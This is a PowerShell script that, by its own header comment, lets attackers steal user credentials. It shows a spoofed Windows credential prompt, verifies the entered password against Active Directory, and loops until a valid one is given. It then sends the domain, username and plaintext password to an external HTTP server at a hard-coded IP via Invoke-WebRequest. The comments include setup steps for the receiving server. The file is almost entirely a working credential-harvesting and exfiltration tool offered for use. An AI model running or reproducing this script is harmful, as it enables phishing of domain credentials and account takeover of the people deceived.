# This script will allow attackers to leak users credentials to external web servers.
# In order to do so, run "python -m SimpleHTTPServer" and add the IP to the script below.


$username = $env:USERNAME
$CurrentDomain_1 = $env:USERDOMAIN
$status = $true


function Credentials(){
    while ($status){
        $creds = Get-Credential -Message "Enter Credentials:" -UserName $CurrentDomain_1"\"$username
        if (!$creds.Password -or $creds.Password -eq $null){
            Credentials
        }
        if (!$creds){
            Credentials
        }
        else {
        $password = $creds.GetNetworkCredential().password
        $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
        $domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$username,$password)

        if ($domain.name -eq $null){
            Credentials
        }
        else
        {
            try{
            Invoke-WebRequest http://192.168.28.138:8000/$CurrentDomain_1";"$username";"$password -Method Get
            }
            catch{
            write-host "LEAKED"
            }
            $status = $false
            exit
        }
      }
   }
}


Credentials
